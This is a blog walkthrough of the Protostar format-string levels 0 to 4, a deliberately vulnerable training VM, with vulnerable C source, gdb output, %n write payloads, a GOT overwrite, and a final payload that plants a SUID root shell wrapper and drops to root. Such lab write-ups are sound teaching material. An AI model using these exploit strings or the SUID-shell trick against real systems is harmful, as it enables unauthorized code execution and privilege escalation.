---
layout: post
title: Protostar Walkthrough - Format Strings
---

Protostar is a virtual machine from [Exploit Exercises][exploit-exercises] that
goes through basic memory corruption issues.

This blog post is a continuation from my [previous][protostar-stack-writeup]
writeup on the stack exploitation stages of Protostar and will deal with the
format string exercises.

scut's [Exploiting Format String Vulnerabilities][exploiting-format-string-paper]
is a good primer to read before following along the walkthrough.

The sha1sum of the ISO I am working with is d030796b11e9251f34ee448a95272a4d432cf2ce.

{:toc}

# format 0

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);

  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

While we can obviously exploit this via a standard stack buffer overflow, we
want to do this by exploiting format strings. We are told that this level
should be done in less than 10 bytes of input.

We take a look at a disassembly of the `vuln()` function.

```shell
(gdb) disass vuln
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:    push   %ebp
0x080483f5 <vuln+1>:    mov    %esp,%ebp
0x080483f7 <vuln+3>:    sub    $0x68,%esp
0x080483fa <vuln+6>:    movl   $0x0,-0xc(%ebp)
0x08048401 <vuln+13>:   mov    0x8(%ebp),%eax
0x08048404 <vuln+16>:   mov    %eax,0x4(%esp)
0x08048408 <vuln+20>:   lea    -0x4c(%ebp),%eax
0x0804840b <vuln+23>:   mov    %eax,(%esp)
0x0804840e <vuln+26>:   call   0x8048300 <sprintf@plt>
0x08048413 <vuln+31>:   mov    -0xc(%ebp),%eax
0x08048416 <vuln+34>:   cmp    $0xdeadbeef,%eax
0x0804841b <vuln+39>:   jne    0x8048429 <vuln+53>
0x0804841d <vuln+41>:   movl   $0x8048510,(%esp)
0x08048424 <vuln+48>:   call   0x8048330 <puts@plt>
0x08048429 <vuln+53>:   leave
0x0804842a <vuln+54>:   ret
End of assembler dump.
```

The interesting memory locations here are `-0x4c(%ebp)` which belongs to
`buffer` and `-0xc(%ebp)` which belongs to `target`.

One method of exploiting format strings is pretty similar to buffer overflows.
You can write a large string into a buffer with a relatively short format
string. For example, a format string `%128d` results in a 128 byte string.
Using this trick, it is simple to write past `buffer` into `target`. We want to
create a format string that writes 64 characters followed by `0xdeadbeef`,
which results in `target` being overwritten.

```shell
user@protostar:~$ /opt/protostar/bin/format0 $(python -c "print '%64d\xef\xbe\xad\xde'")
you have hit the target correctly :)
```

# format 1

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);

  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Like before, we want to overwrite `target`. However, this time `target`'s
location on the stack is very far away from our current location on the stack.

```shell
(gdb) info reg
eax            0x0      0
ecx            0x87cb0d94       -2016735852
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff760       0xbffff760
ebp            0xbffff778       0xbffff778
esi            0x0      0
edi            0x0      0
eip            0x80483fa        0x80483fa <vuln+6>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) print &target
$1 = (int *) 0x8049638
```

With format string vulnerabilities, you are able to directly write into an
arbitrary memory address. The `%n` format parameter writes the number of bytes
written so far by the format string function into a memory address referenced
by a pointer. The pointer, like all other parameters, is passed through the
stack. Since our input to the `printf()` function is stored on the stack (as it
is passed through `argv`), we have all the neccessary components to exploit
this.

The first hurdle to exploitation is that the `printf()` is not in the same
stack frame as the input string. This usually means that the input string is
very far away from our current stack pointer. We first need to locate where the
start of our input string is.

Conveniently, format string vulnerabiltiies provide us with a very easy way to
read the stack. Each `%x` prints out the next 4 bytes on the stack and moves
the stack pointer forward by the same amount. The fact that format string
vulnerabilities provide both a read _and_ write primitive is why they are
so powerful.

```shell
user@protostar:/opt/protostar/bin$ /opt/protostar/bin/format1 $(python -c "print 'AAAA' + '%x.%x'")
AAAA804960c.bffff788
```

We want to increment this until we locate the start of our input string
(`0x41414141`) on the stack. This is known as "stack popping".

```shell
user@protostar:/opt/protostar/bin$ /opt/protostar/bin/format1 $(python -c "print 'AAAA' + '%x.'*134 + '%x'")
AAAA804960c.bffff5f8.8048469.b7fd8304.b7fd7ff4.bffff5f8.8048435.bffff7dc.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff678.b7eadc76.2.bffff6a4.bffff6b0.b7fe1848.bffff660.ffffffff.b7ffeff4.804824d.1.bffff660.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff678.230a9a2b.95eec3b.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6a4.8048450.8048440.b7ff1040.bffff69c.b7fff8f8.2.bffff7c1.bffff7dc.0.bffff975.bffff983.bffff98f.bffff9b0.bffff9c3.bffff9d6.bffff9e0.bffffed0.bfffff0e.bfffff22.bfffff39.bfffff4a.bfffff52.bfffff62.bfffff6f.bfffffa3.bfffffb2.bfffffcf.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7ab.1f.bfffffe1.f.bffff7bb.0.0.0.0.0.77000000.4d5d1483.52aa6e73.a62e2707.69255758.363836.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.317461.41414141
```

Now, we can replace "AAAA" with the address of `target` and the final `%x` with
`%n` to write to the address.

```shell
user@protostar:/opt/protostar/bin$ /opt/protostar/bin/format1 $(python -c "print '\x38\x96\x04\x08' + '%x.'*134 + '%n'")
804960c.bffff5f8.8048469.b7fd8304.b7fd7ff4.bffff5f8.8048435.bffff7dc.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff678.b7eadc76.2.bffff6a4.bffff6b0.b7fe1848.bffff660.ffffffff.b7ffeff4.804824d.1.bffff660.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff678.b4f3baa6.9ea7ccb6.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6a4.8048450.8048440.b7ff1040.bffff69c.b7fff8f8.2.bffff7c1.bffff7dc.0.bffff975.bffff983.bffff98f.bffff9b0.bffff9c3.bffff9d6.bffff9e0.bffffed0.bfffff0e.bfffff22.bfffff39.bfffff4a.bfffff52.bfffff62.bfffff6f.bfffffa3.bfffffb2.bfffffcf.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7ab.1f.bfffffe1.f.bffff7bb.0.0.0.0.0.f1000000.ddb611b5.5aeca58f.e7cb7a22.691b4515.363836.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.317461.you have modified the target :)
```

With this method of exploitation, the key is to align your input string with
the stack pointer. It is important to remember that the format string you
supply is stored on the stack as well. With `%x`, you are using 2 bytes to pop
4 bytes from the stack. There are other format string parameters you can use
as well to win the "race" if you can only provide a limited number of input
bytes.

# format 2

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);

  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

This is similar to format 1 except that we now have to write a specific value
to `target`.

We locate the start of our input string. This time, it's much easier since it
gets copied to a buffer in the same stack frame as our `printf()`function.

```shell
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA' + '%x.'*3 + '%x'" | /opt/protostar/bin/format2
AAAA200.b7fd8420.bffff5c4.41414141
target is 0 :(
```

With GDB, we find the memory address of `target`.

```shell
(gdb) print &target
$2 = (int *) 0x80496e4
```

We demonstrate that we can write to `target`.

```shell
user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08' + '%x.'*3 + '%n'" | /opt/protostar/bin/format2
200.b7fd8420.bffff5c4.
target is 26 :(
```

Now, remember that `%n` writes the number of bytes that have already been
written by the function. We have control over that since we can supply
different format string parameters to write more or less bytes. This is usually
done by using `%nu` where `n` is a number that we can manipulate to write the
number of bytes we want.

```shell
user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08' + '%x.'*2 + '%47u' + '%n'" | /opt/protostar/bin/format2
200.b7fd8420.                                     3221222852
you have modified the target :)
```

# format 3

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);

  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

This is similar to format 2 except that we now have to precisely control what
gets written to `target`.

Again, we start by locating the start of our input string.

```shell
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA' + '%x.'*11 + '%x'" | /opt/protostar/bin/format3
AAAA0.bffff580.b7fd7ff4.0.0.bffff788.804849d.bffff580.200.b7fd8420.bffff5c4.41414141
target is 00000000 :(
```

We also find the memory address of `target`.

```shell
(gdb) print &target
$2 = (int *) 0x80496f4
```

We show that we are able to write to `target`.

```shell
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x96\x04\x08' + '%x.'*11 + '%n'" | /opt/protostar/bin/format3
0.bffff580.b7fd7ff4.0.0.bffff788.804849d.bffff580.200.b7fd8420.bffff5c4.
target is 0000004c :(
```

With format strings, we can supply different addresses one after another on the
stack and supply multiple `%n` parameters to write to the least significant
byte of each address in sequence.

For example, we can write to all 4 bytes of `target`.

```shell
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08' + '%x.'*11 + '%n%n%n%n'" | /opt/protostar/bin/format3
0.bffff580.b7fd7ff4.0.0.bffff788.804849d.bffff580.200.b7fd8420.bffff5c4.
target is 58585858 :(
```

How do we control the value that gets writen for each individual byte? We use
the same `%nu` technique. Before we can place a `%nu` before each `%n`, we need
to pad our input string since each `%nu` also pops the stack. We do this by
adding `\x01\x01\x01\x01` before each address in our input string.

```shell
user@protostar:/opt/protostar/bin$ python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x.'*11 + '%u%n%u%n%u%n%u%n'" | /opt/protostar/bin/format3
0.bffff580.b7fd7ff4.0.0.bffff788.804849d.bffff580.200.b7fd8420.bffff5c4.16843009168430091684300916843009
target is 88807870 :(
```

The final step here is to determine the `n` value for each `%nu` format
parameter. scut's paper has a method we can use to calculate the value. We
translate it to a Python function.

```python
def calculate(to_write, written):
    to_write += 0x100
    written %= 0x100
    padding = (to_write - written) % 0x100
    if padding < 10:
        padding += 0x100
    return padding
```

`to_write` is the value we want to write at a particular `%n`, `written` is the
number of bytes that have been written by the format string function so far.
`calculate(0x44, 0x68)` gets us `220`. How do we get `0x68`? Remember when we
first demonstrated writing to all 4 bytes of `target` and we wrote `0x58` to
each byte? We increased the length of our input string by 16 bytes
(`\x01\x01\x01\01` * 4) so we add `0x58 + 16 = 0x68`.

```shell
user@protostar:/opt/protostar/bin$ python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x.'*11 + '%220u%n%u%n%u%n%u%n'" | /opt/protostar/bin/format3
0.bffff580.b7fd7ff4.0.0.bffff788.804849d.bffff580.200.b7fd8420.bffff5c4.                                                                                                                                                                                                                    16843009168430091684300916843009
target is 5c544c44 :(
```

From here, it is easy to calculate the other 3 `n` values. We simply use the
previous byte as the `written` parameter and the target byte as the `to_write`
parameter in our Python function. Doing this, we see that the 4 `n` values we
need to supply are 220, 17, 173 and 255.

```shell
user@protostar:/opt/protostar/bin$ python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x.'*11 + '%220u%n%17u%n%173u%n%255u%n'" | /opt/protostar/bin/format3
0.bffff580.b7fd7ff4.0.0.bffff788.804849d.bffff580.200.b7fd8420.bffff5c4.                                                                                                                                                                                                                    16843009         16843009                                                                                                                                                                     16843009                                                                                                                                                                                                                                                       16843009
you have modified the target :)
```

# format 4

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);
}

int main(int argc, char **argv)
{
  vuln();
}
```

In this level, our goal is to redirect execution to the `hello()` function.

We start by taking a look at the disassembly of the `vuln()` function.

```shell
(gdb) disass vuln
Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:    push   %ebp
0x080484d3 <vuln+1>:    mov    %esp,%ebp
0x080484d5 <vuln+3>:    sub    $0x218,%esp
0x080484db <vuln+9>:    mov    0x8049730,%eax
0x080484e0 <vuln+14>:   mov    %eax,0x8(%esp)
0x080484e4 <vuln+18>:   movl   $0x200,0x4(%esp)
0x080484ec <vuln+26>:   lea    -0x208(%ebp),%eax
0x080484f2 <vuln+32>:   mov    %eax,(%esp)
0x080484f5 <vuln+35>:   call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:   lea    -0x208(%ebp),%eax
0x08048500 <vuln+46>:   mov    %eax,(%esp)
0x08048503 <vuln+49>:   call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:   movl   $0x1,(%esp)
0x0804850f <vuln+61>:   call   0x80483ec <exit@plt>
End of assembler dump.
```

We are going to redirect the execution flow by overwriting the entry for the
`exit()` function in the Global Offset Table (GOT). Without going into great
detail, the GOT is essentially how shared library functions are loaded in a
dynamically linked ELF binary. Eli Bendersky's [blog post][got-blog-post] has
a good explanation on how it works.

Taking a look at the binary with objdump, we see that the `exit()` function has
an entry in the GOT at `0x08049724`. If we overwrite the value at that address
with the memory address of `hello()` we should be successful.


```shell
user@protostar:/opt/protostar/bin$ objdump -TR /opt/protostar/bin/format4

/opt/protostar/bin/format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*  00000000              __gmon_start__
00000000      DF *UND*  00000000  GLIBC_2.0   fgets
00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*  00000000  GLIBC_2.0   _exit
00000000      DF *UND*  00000000  GLIBC_2.0   printf
00000000      DF *UND*  00000000  GLIBC_2.0   puts
00000000      DF *UND*  00000000  GLIBC_2.0   exit
080485ec g    DO .rodata        00000004  Base        _IO_stdin_used
08049730 g    DO .bss   00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit
```

As with all format string attacks, we start by locating the input string on the
stack.

```shell
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA' + '%x.'*3 + '%x'" | /opt/protostar/bin/format4
AAAA200.b7fd8420.bffff5c4.41414141
```

Next, we attempt to write all 4 bytes of the `exit()` GOT entry.

```shell
user@protostar:/tmp$ python -c "print '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08' + '%x.'*3 + '%n%n%n%n'"> a
(gdb) run < a
Starting program: /opt/protostar/bin/format4 < a
200.b7fd8420.bffff5b4.

Program received signal SIGSEGV, Segmentation fault.
0x26262626 in ?? ()
```

And look for the memory address of the `hello()` function.

```shell
(gdb) print &hello
$1 = (void (*)(void)) 0x80484b4 <hello>
```

With all that information, we can calculate that the 4 `n`'s we need to supply
to the `%nu` format string parameters are 126, 208, 128 and 260. If you are
unsure how to do this, you can go back to format 3's explanation.

Putting everything together,

```shell
user@protostar:/tmp$ python -c "print '\x01\x01\x01\x01\x24\x97\x04\x08\x01\x01\x01\x01\x25\x97\x04\x08\x01\x01\x01\x01\x26\x97\x04\x08\x01\x01\x01\x01\x27\x97\x04\x08' + '%x.'*3 + '%126u%n%208u%n%128u%n%260u%n'" | /opt/protostar/bin/format4
200.b7fd8420.bffff5d4.                                                                                                                      16843009                                                                                                                                                                                                        16843009                                                                                                                        16843009                                                                                                                                                                                                                                                            16843009
code execution redirected! you win
```

While this is the end of the challenge itself, it would be boring to end this
blog post without a shell. We will use the same GOT entry overwrite method
to obtain code execution on the target binary.

There is however a problem. If we overwrite `exit()` with `system()`, we will
end up calling `system(1)` and we have no way to change that value. Instead,
we will overwrite `exit()` with `vuln()` and `printf()` with `system()` so that
we can pass our shell command through `stdin` in the second call to `vuln()`.

We look for the memory address of the `system()` and `vuln()` functions.

```shell
(gdb) print &system
$1 = (<text variable, no debug info> *) 0xb7ecffb0 <__libc_system>
(gdb) print &vuln
$1 = (void (*)(void)) 0x80484d2 <vuln>
```

We successfully overwrite the GOT entries for `exit()` and `printf()`.

```shell
user@protostar:~$ python -c "print '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08\x1c\x97\x04\x08\x1d\x97\x04\x08\x1e\x97\x04\x08\x1f\x97\x04\x08' + '%x.'*3 + '%n%n%n%n%n%n%n%n'" > a
(gdb) run < a
Starting program: /opt/protostar/bin/format4 < a
200.b7fd8420.bffff5b4.

Program received signal SIGSEGV, Segmentation fault.
0x36363636 in ?? ()

(gdb) x/x 0x0804971c
0x804971c <_GLOBAL_OFFSET_TABLE_+28>:   0x36363636
(gdb) x/x 0x08049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:   0x36363636
```

The 8 `n`'s we need to supply to the `%nu` format string parameters are 124,
178, 128, 260, 168, 79, 237 and 203.

Now, what do we want `system()` to call? As with all `stdin` based exploit
vectors, it is a bit of an ugly hack to get the standard `system("/bin/sh")`
to work. Like in my previous blog post on the stack exploitation exercises, I
prefer to write a root owned SUID shell wrapper, `shell.c`.

```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/bin/bash");
}
```

We compile the C code.

```shell
user@protostar:~$ gcc shell.c -o shell
```

Putting everything together, we get the following. You will see that we have a
`\x0a` in there which is a NULL byte. This tells the first `fgets()` call to
stop reading from `stdin`. We follow that by the command string we want
`system()` to run on the second call to `vuln()`.

```shell
user@protostar:~$ python -c "print '\x01\x01\x01\x01\x24\x97\x04\x08\x01\x01\x01\x01\x25\x97\x04\x08\x01\x01\x01\x01\x26\x97\x04\x08\x01\x01\x01\x01\x27\x97\x04\x08\x01\x01\x01\x01\x1c\x97\x04\x08\x01\x01\x01\x01\x1d\x97\x04\x08\x01\x01\x01\x01\x1e\x97\x04\x08\x01\x01\x01\x01\x1f\x97\x04\x08' + '%x.'*3 + '%124u%n%178u%n%128u%n%260u%n%168u%n%79u%n%237u%n%203u%n\x0a/bin/chown root:root /home/user/shell; /bin/chmod 4755 /home/user/shell'" | /opt/protostar/bin/format4
200.b7fd8420.bffff5d4.                                                                                                                    16843009                                                                                                                                                                          16843009                                                                                                                        16843009                                                                                                                                                                                                                                                            16843009                                                                                                                                                                16843009                                                                       16843009                                                                                                                                                                                                                                     16843009                                                                                                                                                                                                   16843009
sh: : not found
sh: : not found
^C^CSegmentation fault

user@protostar:~$ ./shell
root@protostar:~# whoami
root
```

[exploit-exercises]: https://exploit-exercises.com
[protostar-stack-writeup]: 2018-05-22-protostar-walkthrough-stack
[exploiting-format-string-paper]: https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf
[got-blog-post]: https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/
